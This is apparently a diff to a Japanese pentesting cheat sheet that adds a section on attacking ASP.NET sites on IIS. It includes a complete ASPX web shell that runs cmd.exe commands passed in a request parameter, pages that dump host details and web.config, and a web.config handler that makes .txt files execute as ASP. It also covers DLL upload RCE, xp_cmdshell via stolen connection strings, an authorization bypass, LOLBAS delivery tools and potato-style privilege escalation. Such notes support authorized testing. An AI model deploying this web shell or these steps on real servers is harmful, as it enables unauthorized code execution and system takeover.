@@ -491,6 +491,249 @@ $output = implode("\n", $arr);
 ## ASP
 
 - ASP.NET アプリは bin 配下の DLL を自動的にロードする仕組みになっている
+## ASP / ASP.NET (IIS)
+
+### 基本 Web Shell
+
+```aspx
+<%@ Page Language="C#" %>
+<%
+Response.Write(
+    new System.IO.StreamReader(
+        new System.Diagnostics.Process(){
+            StartInfo = new System.Diagnostics.ProcessStartInfo(){
+                FileName="cmd.exe",
+                Arguments="/c " + Request["cmd"],
+                RedirectStandardOutput=true,
+                UseShellExecute=false,
+                CreateNoWindow=true
+            }
+        }.Start().StandardOutput.BaseStream
+    ).ReadToEnd()
+);
+%>
+```
+
+実行例
+```
+http://target/shell.aspx?cmd=whoami
+```
+
+### ターゲット状態確認
+
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Security.Principal" %>
+<%@ Import Namespace="System.IO" %>
+
+User: <%= WindowsIdentity.GetCurrent().Name %><br>
+Auth: <%= User.Identity.IsAuthenticated %><br>
+Machine: <%= Environment.MachineName %><br>
+OS: <%= Environment.OSVersion %><br>
+64bit: <%= Environment.Is64BitOperatingSystem %><br>
+CLR: <%= Environment.Version %><br>
+AppPool Identity: <%= WindowsIdentity.GetCurrent().Name %><br>
+Current Dir: <%= Directory.GetCurrentDirectory() %><br>
+```
+
+### ファイル読み取り
+
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.IO" %>
+<%= File.ReadAllText(@"C:\inetpub\web.config") %>
+```
+
+### 重要ファイル（Windows + IIS）
+
+
+---
+
+## DLL アップロードによる RCE
+
+条件：
+
+- Webroot書き込み可能
+- /bin に配置可能
+
+理由：
+
+- ASP.NET は bin の DLL を自動ロード
+
+---
+
+## MSSQL 連携攻撃
+
+web.config に：
+
+```
+connectionStrings
+```
+
+がある。
+
+取得後：
+
+```sql
+xp_cmdshell
+```
+
+有効化で OS コマンド実行。
+
+---
+
+## ファイルアップロード → 実行
+
+### 実行可能拡張子
+
+| 拡張子 |
+|--------|
+aspx
+ashx
+asmx
+config（場合による）
+
+---
+
+### web.config アップロードで RCE
+
+```xml
+<configuration>
+  <system.webServer>
+    <handlers>
+      <add name="cmd" path="*.txt" verb="*" modules="IsapiModule"
+           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
+           resourceType="File"/>
+    </handlers>
+  </system.webServer>
+</configuration>
+```
+
+txt を ASP として実行可能。
+
+---
+
+## よくあるミス設定
+
+### 詳細エラー表示 ON
+
+```
+customErrors mode="Off"
+```
+
+→ フルパス漏洩
+
+---
+
+### デバッグ有効
+
+```
+debug="true"
+```
+
+→ 情報漏洩
+
+---
+
+### requestValidationMode="2.0"
+
+→ 古い検証 → XSS
+
+---
+
+## 認証バイパス
+
+### web.config
+
+```xml
+<authorization>
+  <deny users="?" />
+</authorization>
+```
+
+フォルダ内に
+
+```xml
+<allow users="*" />
+```
+
+を置くとバイパス。
+
+---
+
+## パス列挙
+
+```
+trace.axd
+elmah.axd
+```
+
+---
+
+## SSRF / LFI 相当
+
+.NET のファイル読み取り：
+
+```csharp
+Server.MapPath()
+File.ReadAllText()
+```
+
+---
+
+## ペイロード配置
+
+### LOLBAS
+
+```
+certutil
+msbuild
+installutil
+regsvr32
+mshta
+```
+
+---
+
+## 権限昇格チェック
+
+```
+whoami /priv
+```
+
+SeImpersonatePrivilege があれば：
+
+- JuicyPotato
+- PrintSpoofer
+
+---
+
+## IIS 特有の横展開
+
+```
+C:\inetpub\wwwroot\
+```
+
+他サイトが入っている。
+
+---
+
+## ログ
+
+```
+C:\inetpub\logs\LogFiles\
+```
+
+---
+
+## 重要ディレクトリ
+
+| ディレクトリ | 意味 |
+|-------------|------|
+App_Data | DB / 機密 |
+bin | DLL |
+Views | ソース |
+
 
 
 ---
